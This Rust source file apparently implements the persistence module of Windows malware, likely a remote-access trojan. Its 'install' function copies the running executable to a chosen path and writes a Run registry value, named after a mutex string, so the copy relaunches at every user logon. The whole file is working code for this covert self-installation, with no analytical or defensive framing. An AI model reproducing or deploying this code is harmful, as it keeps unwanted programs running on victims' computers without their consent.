use std::process::Command;

/// Copy the current executable to the install path and add a registry Run key.
pub fn install(mutex_name: &str, install_path: &str) {
    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };

    let dest = expand_env(install_path);

    // Create parent dirs
    if let Some(parent) = std::path::Path::new(&dest).parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    let _ = std::fs::copy(&exe, &dest);

    // Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    let _ = Command::new("reg")
        .args(&[
            "add",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            mutex_name,
            "/t",
            "REG_SZ",
            "/d",
            &dest,
            "/f",
        ])
        .output();
}

fn expand_env(path: &str) -> String {
    let mut result = path.to_string();
    for (key, val) in std::env::vars() {
        result = result.replace(&format!("%{}%", key), &val);
    }
    result
}
